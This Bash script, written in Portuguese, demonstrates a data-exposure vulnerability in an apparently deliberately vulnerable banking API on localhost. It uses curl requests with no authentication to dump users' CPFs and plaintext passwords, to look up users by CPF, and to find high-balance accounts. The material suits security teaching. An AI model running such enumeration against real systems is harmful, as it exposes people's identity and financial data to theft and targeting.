#!/bin/bash

# Script para demonstrar exposição de dados
# APENAS PARA FINS EDUCATIVOS

echo "========================================"
echo "  VULNERABILIDADE: DADOS EXPOSTOS"
echo "========================================"
echo

BASE_URL="http://localhost:8080"

echo "DEMONSTRAÇÃO: Exposição de dados sensíveis"
echo "Explorando endpoints que expõem informações sem autenticação"
echo


# 1. Listagem de usuários sem autenticação
echo "1. Exposição de dados de usuários"
echo "----------------------------------"
echo "Endpoint: GET /api/usuarios/listar"
echo "Descrição: Lista todos os usuários com CPFs, senhas e dados pessoais"
echo "Autenticação: Não requerida"
echo

echo "Comando:"
echo "curl -s '$BASE_URL/api/usuarios/listar'"
echo
echo "Resposta:"
USUARIOS_RESPONSE=$(curl -s "$BASE_URL/api/usuarios/listar")
echo "$USUARIOS_RESPONSE" | jq . 2>/dev/null || echo "$USUARIOS_RESPONSE"
echo
echo "DADOS EXPOSTOS:"
echo "• CPFs completos de todos os usuários"
echo "• Senhas em texto claro"
echo "• Nomes completos"
echo "• Endereços de email"
echo "• IDs internos do sistema"
echo


# 2. Busca de usuário por CPF
echo "2. Busca de usuário específico por CPF"
echo "---------------------------------------"
echo "Endpoint: GET /api/usuarios/buscar/{cpf}"
echo "Descrição: Busca usuário específico usando CPF"
echo "Autenticação: Não requerida"
echo

CPF_TESTE="12345678901"
echo "Testando com CPF: $CPF_TESTE"
echo
echo "Comando:"
echo "curl -s '$BASE_URL/api/usuarios/buscar/$CPF_TESTE'"
echo
echo "Resposta:"
USER_RESPONSE=$(curl -s "$BASE_URL/api/usuarios/buscar/$CPF_TESTE")
echo "$USER_RESPONSE" | jq . 2>/dev/null || echo "$USER_RESPONSE"
echo
echo "DADOS EXPOSTOS:"
echo "• Dados completos do usuário específico"
echo "• Possibilidade de enumeração de CPFs"
echo "• Violação de privacidade individual"
echo


# 3. Consulta de saldos por valor mínimo
echo "3. Consulta de saldos por faixa de valor"
echo "----------------------------------------"
echo "Endpoint: GET /api/contas/buscar-por-saldo/{saldoMinimo}"
echo "Descrição: Busca contas com saldo maior que valor especificado"
echo "Autenticação: Não requerida"
echo

SALDO_TESTE="10000"
echo "Testando saldos maiores que R$ $SALDO_TESTE"
echo
echo "Comando:"
echo "curl -s '$BASE_URL/api/contas/buscar-por-saldo/$SALDO_TESTE'"
echo
echo "Resposta:"
SALDOS_RESPONSE=$(curl -s "$BASE_URL/api/contas/buscar-por-saldo/$SALDO_TESTE")
echo "$SALDOS_RESPONSE" | jq . 2>/dev/null || echo "$SALDOS_RESPONSE"
echo
echo "DADOS EXPOSTOS:"
echo "• Contas com altos saldos"
echo "• Identificação de usuários ricos"
echo "• Dados para possível targeting"
echo



echo "========================================"
echo " DADOS EXPOSTOS - DEMONSTRAÇÃO COMPLETA"
echo "========================================"